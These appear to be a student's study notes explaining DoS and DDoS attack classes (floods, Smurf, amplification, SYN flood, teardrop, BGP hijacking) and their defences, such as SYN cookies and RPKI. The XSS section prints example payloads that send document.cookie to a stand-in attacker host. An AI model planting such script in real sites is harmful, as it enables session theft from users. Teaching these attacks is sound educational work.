# DoS and DDoS Attacks

## INTERRUPTION: LOSS OF SERVICE DOS



![[Pasted image 20260408063906.png]]

## Volumetric Attacks

### ICMP Flood (Ping Flood)

Attackers send massive amounts of ping requests (ICMP Echo Requests) to the target. The victim's system gets overwhelmed trying to respond to each one, consuming bandwidth and processing power. The attacker often **spoofs source IPs** so the replies go elsewhere, making it harder to trace.

1. Works when attacker has greater bandwidth than victim

- Victim's server has a **100 Mbps** internet connection
- If the attacker can send **200 Mbps** worth of ICMP packets, the victim's road is **completely jammed**

II's purely about whether the attacker can **generate more traffic than the victim's connection can handle.**

If victim has greater bandwidth, attacker needs amplification or distribution"**
- **Amplification** → trick other servers into sending huge responses to the victim (DNS amplification)
- **Distribution** → use a botnet, thousands of machines flooding at once (DDoS)

2. **ICMP and UDP stacks have no end-to-end handshake process**. This makes flood attacks harder to detect

| Factor                        | Explanation                                                                                |
| ----------------------------- | ------------------------------------------------------------------------------------------ |
| **No connection state**       | Firewall can't say "this is a suspicious half-open connection" like it can with SYN floods |
| **Spoofed IPs**               | Every packet looks like it came from a different legitimate IP — no pattern to block       |
| **Looks like normal traffic** | A ping is a ping — it's a standard network operation                                       |
| **No session to track**       | IDS systems track behavior over a session — no session means nothing to analyze            |

### UDP Flood

Similar concept, attackers blast the target with UDP packets on random ports. Since UDP is connectionless, the victim's system has to:
1. Check if any application is listening on that port
2. Send back an ICMP "Destination Unreachable" message when nothing is

### Smurf Attack

![[Pasted image 20260408102701.png]]

#### The Broadcast Address — Key Concept

This is what makes Smurf unique. A **broadcast address** means:

- Normal IP packet → sent to **one specific machine**
- Broadcast packet → sent to **every machine on the network** at once

For example on a network of 192.168.1.x:

- Normal: send to `192.168.1.5` → only that machine gets it
- Broadcast: send to `192.168.1.255` → **every machine** on that network gets it

So the attacker only sends **one packet** but every host on that network responds — all replies going to the victim's spoofed IP.

#### The Core Difference

![[Pasted image 20260408102927.png]]

#### Ping Flood — Attacker Does All the Work

```
Attacker ────────────────────────→ Victim
Attacker ────────────────────────→ Victim
Attacker ────────────────────────→ Victim
(attacker must have more bandwidth than victim)
```

---

#### Smurf Attack — Network Does the Work

```
Attacker sends ONE packet to broadcast address
(spoofed as victim's IP)
        ↓
Host 1 ──────────────────────────→ Victim
Host 2 ──────────────────────────→ Victim
Host 3 ──────────────────────────→ Victim
Host 4 ──────────────────────────→ Victim
... every single host on the network replies
```

#### What IP Spoofing Actually Is

When you send a packet across the internet it has a **header** that contains:

- **Source IP (who sent it)**
- **Destination IP (who it's going to)**

That source IP field? **There is no verification on it whatsoever.** Anyone can manually write anything they want in that field.

Think of it like sending a physical letter:

```
You can write ANY return address on an envelope
Post office does not verify if that return address is real
Whoever receives the letter will send replies to that fake return address
```

---

#### So How Does the Attacker Know Your IP?

Your IP is not secret at all. The attacker can get it by:

| Method                                 | How                                             |
| -------------------------------------- | ----------------------------------------------- |
| **You visited a website they control** | Server logs your IP automatically               |
| **Port scanning**                      | Tools like Nmap scan and find active IPs        |
| **Packet sniffing**                    | If on same network, they see your traffic       |
| **Social engineering**                 | Trick you into revealing it                     |
| **Simply googling**                    | If you've posted online, your IP may be exposed |

Your IP is handed out **freely** every time you visit any website — it has to be, otherwise the website wouldn't know where to send the response.

---

#### Spoofing in the Smurf Attack Context

```
Attacker knows victim's IP = 192.168.1.10
        ↓
Attacker crafts ICMP packet manually:
┌─────────────────────────────────┐
│ Source IP:      192.168.1.10    │  ← FAKE (victim's IP written here)
│ Destination IP: 192.168.1.255   │  ← broadcast address
│ Data: ICMP Echo Request         │
└─────────────────────────────────┘
        ↓
Every host on network receives it
        ↓
They all see SOURCE = 192.168.1.10
"Oh this ping came from .10, let me reply to .10"
        ↓
All replies flood back to victim
Attacker's real IP is never involved
```

---

#### The Attacker Never Touched the Victim's Machine

This is the key insight:

- No hacking of victim's laptop needed
- No malware installed on victim
- Just **writing a fake return address** on the packet
- The network itself does the rest

---

#### Why Can't We Just Block Spoofed IPs?

Because by the time the flood reaches the victim:

- Traffic **appears to come from legitimate hosts** (X, Y, DNS servers etc)
- The real attacker's IP is completely hidden

This is why spoofing is so powerful — the attacker becomes **completely invisible** behind the flood.

### Amplification Attacks (CharGEN / NTP / SNMP)

#### What is CharGEN?

**Character Generator Protocol** — a super old protocol from the 1980s.

- Originally made for **network testing**
- You send it any small request and it just **responds with a stream of random characters**
- Still running on old devices like **printers and copiers** that never got updated

```
Attacker sends:    "hello"  (5 bytes)
CharGEN responds:  "aAbBcCdDeEfFgGhH....." (hundreds of bytes)
```

Nobody uses it legitimately anymore — it's just sitting there on old devices, making it a perfect amplifier.

---

#### What is NTP?

**Network Time Protocol** — still very much in use today.

- Every device on the internet uses NTP to **sync its clock**
- Your laptop, phone, server — they all ask NTP servers "what time is it?"
- NTP servers respond with the current time

**What is the monlist command?**

monlist is a **diagnostic command** built into older NTP servers:

- It was designed for admins to ask "hey NTP server, show me the last 600 hosts that contacted you"
- Perfectly legitimate admin tool

```
Attacker sends:     monlist request  (~small packet)
NTP server responds: list of 600 hosts  (~massive packet)
```

The problem:

- Request = tiny
- Response = up to **556x larger**
- Attacker spoofs victim's IP → all 600-entry responses flood the victim

---

#### What is SNMP?

**Simple Network Management Protocol** — used to monitor and manage network devices.

- Network admins use it to check on **routers, switches, servers**
- "How much traffic is passing through this router?"
- "How many errors on this interface?"

**What is GetBulk?**

GetBulk is an SNMP command specifically designed to retrieve **large amounts of data at once:**

- Normal SNMP Get = ask for one piece of info
- GetBulk = ask for **everything at once** in one request

```
Attacker sends:     GetBulk request  (small)
SNMP device responds: entire device config, 
                      all interface stats,
                      all routing tables  (massive)
```

---

#### All Three Together — The Pattern

You'll notice they all follow the **exact same pattern:**

|Protocol|Purpose|Why Abused|
|---|---|---|
|**CharGEN**|Network testing|Responds with large random data to any input|
|**NTP**|Clock syncing|monlist dumps 600 host entries for tiny request|
|**SNMP**|Device monitoring|GetBulk dumps entire device data for small request|

They were all **designed to return large amounts of data** — which is exactly what makes them dangerous when combined with IP spoofing.

---

#### Amplification Attack Flow

```
Attacker knows victim IP = 1.2.3.4
        ↓
Attacker uses botnet of 1000 machines
        ↓
Each botnet machine sends spoofed small requests
to thousands of NTP/CharGEN/SNMP servers
(source IP = victim's 1.2.3.4)
        ↓
Every server thinks victim is asking for data
        ↓
Thousands of MASSIVE responses all hit victim
        ↓
50x - 500x amplification × 1000 botnet machines
= victim completely obliterated
```

---

#### Why "Reflectors"?

The slide calls NTP/CharGEN/SNMP servers **reflectors** — good term to remember:

- The attacker's traffic **bounces off** these servers toward the victim
- Like shining a flashlight at a mirror aimed at someone's eyes
- The servers are innocent — they're just doing their job
- Real attack origin is completely hidden behind the reflection


## Protocol-Based Attacks

These are smarter, they don't just flood with volume, they **exploit how a protocol is designed to work**.

### SYN Flood

![[Pasted image 20260408133408.png]]

This abuses the TCP three-way handshake:

- Normally: Client sends **SYN** → Server replies **SYN-ACK** → Client sends **ACK**
- In a SYN flood: The attacker sends tons of **SYN packets** but never completes the handshake (never sends the ACK)
- The server keeps half-open connections in memory waiting for the ACK that never comes, eventually exhausting its connection table

> [[#The Problem SYN Cookies Solve|SYN Cookies]] were developed specifically to counter this attack.

#### The Problem SYN Cookies Solve

Remember the SYN flood problem:

```
Normal TCP handshake:
Client sends SYN
Server replies SYN-ACK and allocates memory 
waiting for ACK
        ↓
Attacker sends thousands of SYNs never completes ACK
        ↓
Server fills up memory with half open connections
Server runs out of resources = crashes
```

The core problem is the server **allocates memory too early** — before knowing if the client is real.

---

#### What Are SYN Cookies?

SYN cookies are a clever trick where the server says:

```
"I will NOT save anything in memory when I get a SYN
Instead I will bake all the connection info 
into the SYN-ACK I send back
If a real client replies with ACK 
I will read the info back from that ACK
Only THEN will I allocate memory"
```

---

#### How the Cookie is Made

When server gets a SYN it creates a **cryptographic hash** called a cookie using:

```
Cookie = hash of:
- Client IP address
- Client port
- Server IP address  
- Server port
- Secret key only server knows
- Timestamp
```

This cookie becomes the **sequence number** in the SYN-ACK response.

#### Full SYN Cookie Flow

**Legitimate client:**

```
Client → SYN → Server
                ↓
        Server calculates cookie
        Cookie = hash(client IP, port, secret...)
        NO memory allocated yet ✅
                ↓
Client ← SYN-ACK (sequence = cookie) ← Server

Client → ACK (sequence = cookie + 1) → Server
                ↓
        Server receives ACK
        Recalculates expected cookie
        Cookie matches! Client is real ✅
        NOW server allocates memory
        Connection established
```

**Attacker doing SYN flood:**

```
Attacker → SYN (spoofed IP) → Server
                ↓
        Server calculates cookie
        Sends SYN-ACK to spoofed IP
        NO memory allocated ✅
                ↓
        ACK never comes back
        Server has nothing stored
        Nothing to overflow ✅
        
Attacker sends 1 million SYNs
Server just keeps calculating cookies
Zero memory used
Server stays alive ✅
```

#### Why Hash and Secret Key?

You might wonder — why not just any number as the cookie?

Because the attacker could:

```
Receive SYN-ACK with sequence number 12345
Send back ACK with 12346
Fake a legitimate handshake!
```

The **secret key** prevents this:

```
Attacker gets SYN-ACK cookie
Cannot forge a valid ACK without knowing the secret key
Even if attacker completes the handshake
Server recalculates cookie and it won't match
Fake connection rejected ✅
```

### IP Null Attack

An IP packet is sent with the **protocol field set to 0** (null) and no flags set. Many older firewalls and IDS systems didn't know how to handle this malformed packet, causing them to crash or let it through — exploiting ambiguity in how the protocol handles edge cases.

### Teardrop Attack

![[Pasted image 20260408111744.png]]

#### Why Do Packets Get Fragmented?

The internet has a limit on how big a single packet can be called **MTU (Maximum Transmission Unit)** — typically **1500 bytes**.

If you send a large file, it gets **chopped up into fragments:**

```
Original Data (3000 bytes)
        ↓
Fragment 1: bytes 0-999
Fragment 2: bytes 1000-1999
Fragment 3: bytes 2000-2999
```

Each fragment travels independently across the network and the **receiving system reassembles them back** into the original data.

---

#### What Are Reassembly Instructions?

Each fragment carries an **offset value** in its header — basically a label saying:

```
Fragment 1: "I start at byte 0,   I am 1000 bytes long"
Fragment 2: "I start at byte 1000, I am 1000 bytes long"
Fragment 3: "I start at byte 2000, I am 1000 bytes long"
```

The receiving system reads these offset labels and uses them like **puzzle piece numbers** to put everything back in order.

---

#### Normal Reassembly vs Teardrop

**Normal:**

```
Frag 1: starts at 0,    length 1000  ──→ [0    to 999 ]
Frag 2: starts at 1000, length 1000  ──→ [1000 to 1999]
Frag 3: starts at 2000, length 1000  ──→ [2000 to 2999]

Perfect fit, no gaps, no overlaps ✅
```

**Teardrop Attack:**

```
Frag 1: starts at 10,  length 50  ──→ [10  to 60 ]
Frag 2: starts at 20,  length 60  ──→ [20  to 80 ]  ← overlaps frag1!
Frag 3: starts at 40,  length 30  ──→ [40  to 70 ]  ← overlaps both!
```

---

#### Why Can't It Reassemble?

Think of it like a **physical jigsaw puzzle:**

```
Normal puzzle:
[piece 1][piece 2][piece 3]
Each piece fits perfectly next to each other ✅

Teardrop puzzle:
[piece 1]
    [piece 2]  ← starts in the MIDDLE of piece 1
       [piece 3]  ← starts in the MIDDLE of piece 2

The pieces physically overlap — impossible to lay flat ❌
```

The OS reassembly code tries to calculate:

- Where does fragment 2 go?
- But fragment 1 is already occupying that space
- Where does the overlap go? Do I overwrite? Do I skip?
- The OS **doesn't know what to do** and crashes or freezes

---

#### Why Does it Crash the OS?

Older operating systems had **no logic to handle overlapping fragments:**

- The reassembly buffer gets corrupted
- The OS tries to write data on top of data already written
- Memory errors cascade
- **Kernel panic / Blue Screen / complete freeze**

This is why it's a **protocol-based attack** — it exploits how the OS **implements** the IP reassembly process, not the volume of traffic.

---

#### Application Layer Fragmentation via HTTP

The same concept applies at Layer 7 using HTTP:

**Normal HTTP request:**

```
GET /page HTTP/1.1
Host: example.com
Content-Length: 1000
[all 1000 bytes arrive completely]
```

**HTTP Fragmentation Attack:**

```
POST /page HTTP/1.1
Content-Length: 10000   ← says it will send 10000 bytes
[sends only 500 bytes then stops]
        ↓
Server waits for remaining 9500 bytes
        ↓
Connection stays open, memory held
        ↓
Repeat thousands of times
        ↓
Server runs out of connections
```

You might recognize this — it's essentially **Slowloris** which we mentioned earlier. Same fragmentation idea but at the HTTP level.

---

#### Why Do Variants Still Emerge?

| Reason                   | Explanation                                                                   |
| ------------------------ | ----------------------------------------------------------------------------- |
| **New protocols**        | Every new protocol has its own reassembly logic that could have the same flaw |
| **IoT devices**          | Printers, cameras, smart devices run old unpatched OS code                    |
| **IPv6**                 | Has its own fragmentation handling — new attack surface                       |
| **Complex interactions** | Two patched systems can still break when combined in unexpected ways          |

The patch fixes the **known overlapping offset** logic — but attackers keep finding **new edge cases** the patch didn't anticipate.

### Routing Attack

![[Pasted image 20260408112229.png]]

#### What is BGP (Border Gateway Protocol)?

Think of the internet as a collection of **thousands of independent networks** called **Autonomous Systems (AS):**

- Your ISP (Comcast, Verizon) = one AS
- Google's network = one AS
- Facebook's network = one AS
- A university network = one AS

BGP is the protocol that tells all these networks **how to reach each other** — it's essentially the **postal routing system of the internet.**

```
Your laptop wants to reach Google.com
        ↓
Your ISP asks BGP: "whats the best path to Google?"
        ↓
BGP says: "go through AS1 → AS4 → AS7 → Google"
        ↓
Your traffic follows that path
```

Every AS constantly **advertises to its neighbors:**

- "Hey I can reach these IP ranges"
- "I have a short/fast path to get there"

---

#### How BGP Hijacking Works

BGP has a **fundamental trust problem** — when an AS advertises a route, nobody verifies if it's telling the truth.

```
Google legitimately owns IP range 8.8.8.0/24
Google advertises: "send traffic for 8.8.8.x to me"
        ↓
Attacker's AS also advertises: 
"send traffic for 8.8.8.x to ME, I have a shorter route!"
        ↓
Other routers believe the attacker
(BGP prefers shorter/more specific routes)
        ↓
All traffic meant for Google now flows through attacker
```

The attacker can then:

- **Eavesdrop** — read all the traffic passing through
- **Modify** — tamper with data in transit
- **Black hole** — just drop all traffic = Denial of Service

#### What is PutinGrad?

This was a **real BGP hijacking incident in 2017.**

```
Normal path:
US users → Google/Facebook/Microsoft servers

What actually happened:
US users → Rostelecom (Russian ISP) → then maybe destination

Rostelecom suddenly advertised BGP routes claiming:
"I have the best path to Google, Facebook, Microsoft"
        ↓
Internet routers believed it
        ↓
Traffic from those major companies 
got rerouted through Russian infrastructure
        ↓
For about 1 hour, Russian networks could see/intercept
traffic meant for major US tech companies
```

**PutinGrad** is just a nickname the security community gave it — combining Putin + Leningrad — because the traffic was routed through Russian state-owned infrastructure. Nobody officially confirmed it was intentional but the security community was deeply suspicious given the specific companies targeted.

#### What is RPKI?

**Resource Public Key Infrastructure** — the fix for BGP's trust problem.

Remember the problem — BGP just **believes whatever any AS advertises.** RPKI adds **cryptographic proof:**

|Without RPKI|With RPKI|
|---|---|
|AS says "I own 8.8.8.0/24"|AS cryptographically **proves** it owns 8.8.8.0/24|
|Everyone just believes it|Other routers **verify the signature**|
|Attacker can lie freely|Attacker's fake advertisement gets **rejected**|

#### Difference between CA Certificate and RPKI Certificate

> **See also:** [[05 - Encryption and Secure Protocols#How Does TLS Provide Server Authentication?|How TLS uses CA certificates]] for HTTPS identity.

![[Pasted image 20260408131147.png]]

---

#### The Chain of Trust Comparison

**CA Certificate chain:**

```
Root CA (DigiCert)
    ↓ signs
Intermediate CA
    ↓ signs
google.com certificate
    ↓
Browser trusts google.com ✅
```

**RPKI Certificate chain:**

```
IANA (owns all IP addresses globally)
    ↓ signs
Regional Registry (ARIN owns North American IPs)
    ↓ signs
Google's certificate "owns 8.8.8.0/24"
    ↓
Router trusts Google's BGP announcement ✅
```

---

#### The Key Difference

- **CA certificates** → prove **identity of a domain name**
- **RPKI certificates** → prove **ownership of an IP address block**

Same cryptographic technology, same concept of chain of trust — but applied to completely different problems at different layers of the internet.

> The same chain of trust concept underpins [[05 - Encryption and Secure Protocols#🔒SSL/TLS|TLS/HTTPS]] certificates for websites.


## Application-Layer (Layer 7) Attacks

These are the **most sophisticated** DDoS attacks because they mimic legitimate user behavior, making them very hard to detect and filter.

---

### Session Hijack Attack

This exploits how web applications manage user sessions.

**How it works:**

1. User logs in → Server creates a **session ID** (stored in a cookie or URL)
2. Attacker **steals or forges** that session ID through:
    - Packet sniffing (on unencrypted HTTP)
    - Cross-Site Scripting (XSS)
    - Session fixation (attacker plants a known session ID before login)
3. Attacker uses that stolen session ID to **impersonate the legitimate user**
4. Server has no idea it's talking to the wrong person

**Why it's application-layer:** It targets the **authentication/session management logic** of the app itself, not the network.

> **More detail:** [[02 - Session Attacks and DNS Security#Session Hijacking|TCP Session Hijacking]] covers the network-level attack in depth.

---

### HTTP GET Flood

This is one of the most common application-layer DDoS attacks.

**How it works:**

1. Attacker sends a **massive number of HTTP GET requests** to the target web server
2. Each request looks completely **legitimate** — it looks just like a real user asking for a webpage
3. The server tries to process every single one:
    - Fetching files from disk
    - Querying the database
    - Rendering dynamic content
4. The server's CPU, memory, and database connections get **exhausted**

**Why it's so dangerous:**

- No malformed packets — it's all valid HTTP traffic
- Firewalls and IDS systems **can't easily block it** without also blocking real users
- Often uses **botnets** so requests come from thousands of different IPs
- Attackers often target **heavy pages** (search pages, login pages, pages with lots of DB queries) to maximize resource usage per request

### XSS (Cross-Site Scripting)

#### How XSS Leads to Session Hijacking

The key weapon is this one line of JavaScript:

javascript

```javascript
document.cookie
```

Session IDs are stored in cookies. If an attacker can get **their JavaScript to run in your browser**, they can steal your cookie and send it to themselves.

---

#### The Two Types

##### 📌 Stored XSS (Persistent)

This is the **comment on a webpage** one you remember.

**How it works:**

1. Attacker posts a comment on a forum/blog containing malicious script:

html

```html
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie)
</script>
```

2. The website **saves that comment to the database** without sanitizing it
3. Every time ANY user loads that page, the script runs in their browser
4. Their session cookie gets silently sent to the attacker's server
5. Attacker pastes that cookie into their browser → **instant session hijack**

**Why it's dangerous:** One injection, unlimited victims, runs forever until removed.

---

##### 📌 Reflected XSS (Non-Persistent)

The malicious script is **not stored** — it lives in the URL and bounces back off the server.

**How it works:**

1. The attacker crafts a malicious URL like:

```
https://bank.com/search?q=<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
```

2. Server takes the `q=` parameter and **reflects it back** in the HTML response without sanitizing:

html

```html
<p>You searched for: <script>fetch(...)</script></p>
```

3. The script runs in the victim's browser
4. Cookie is stolen

**The catch:** The attacker has to **trick the victim into clicking the link** — usually done via phishing emails or fake links


## OSI Layer Mapping

| Attack Type           | Correct Layer                         | Why                                               |
| --------------------- | ------------------------------------- | ------------------------------------------------- |
| **Application-based** | **Layer 7** — Application             | Targets HTTP, HTTPS, DNS, app logic               |
| **Protocol-based**    | **Layer 3 & 4** — Network & Transport | SYN flood = Layer 4 (TCP), IP Null = Layer 3 (IP) |
| **Volumetric**        | **Layer 3 & 4** — Network & Transport | ICMP = Layer 3, UDP = Layer 4                     |

**Volumetric is not strictly Layer 4** — it spans both Layer 3 and Layer 4:

- **ICMP flood** → Layer 3 (Network) — ICMP lives at the IP level, no port numbers involved
- **UDP flood** → Layer 4 (Transport) — UDP uses ports, so it sits at transport layer

**Protocol-based** is the same situation:

- **IP Null attack** → Layer 3 (Network) — manipulates the IP header directly
- **SYN flood** → Layer 4 (Transport) — exploits the TCP handshake

---

### Full OSI DDoS Picture

```
Layer 7 - Application  →  HTTP GET flood, Session hijack, Slowloris
Layer 6 - Presentation →  SSL abuse attacks
Layer 5 - Session      →  Session exhaustion
Layer 4 - Transport    →  SYN flood, UDP flood
Layer 3 - Network      →  ICMP flood, IP Null, IP spoofing
Layer 2 - Data Link    →  MAC flooding
```

## DDoS — Distributed Denial of Service
![[Pasted image 20260408142723.png]]
